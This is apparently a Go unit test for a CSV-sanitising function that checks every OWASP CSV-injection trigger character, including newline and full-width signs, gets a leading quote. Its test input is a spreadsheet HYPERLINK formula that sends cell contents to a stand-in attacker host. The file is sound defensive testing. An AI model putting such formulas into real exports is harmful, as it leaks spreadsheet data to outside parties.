package csvsafe

import (
	"slices"
	"testing"
	"unicode/utf8"
)

// owaspCSVTriggers is OWASP's CSV-injection list of characters a cell must not begin with
// (community.owasp.org/attacks/CSV_Injection, read 2026-10-23), written down independently of
// Neutralize's switch so the fuzz oracle cannot simply mirror the implementation: = + - @,
// TAB, CR, LF, and the full-width equals, plus, minus and at signs.
var owaspCSVTriggers = []rune{'=', '+', '-', '@', '\t', '\r', '\n', '＝', '＋', '－', '＠'}

func beginsWithOWASPTrigger(cell string) bool {
	r, n := utf8.DecodeRuneInString(cell)
	return n > 0 && slices.Contains(owaspCSVTriggers, r)
}

// TestNeutralize_OWASPTriggerList pins every trigger on OWASP's list. LF and the four
// full-width signs were missing: "\n=HYPERLINK(...)" and a full-width "=HYPERLINK(...)" in a
// machine description, audit description or other free-text export field went out as-is.
func TestNeutralize_OWASPTriggerList(t *testing.T) {
	for _, tr := range owaspCSVTriggers {
		in := string(tr) + `HYPERLINK("https://attacker.example/?"&A1,"click")`
		if got := Neutralize(in); got != "'"+in {
			t.Errorf("Neutralize(%+q) = %+q, want a leading single quote", in, got)
		}
	}
	for _, in := range []string{"safe", "a=b", " =x", "'=x", "　=x", "x＝"} {
		if got := Neutralize(in); got != in {
			t.Errorf("Neutralize(%+q) = %+q, want unchanged", in, got)
		}
	}
}
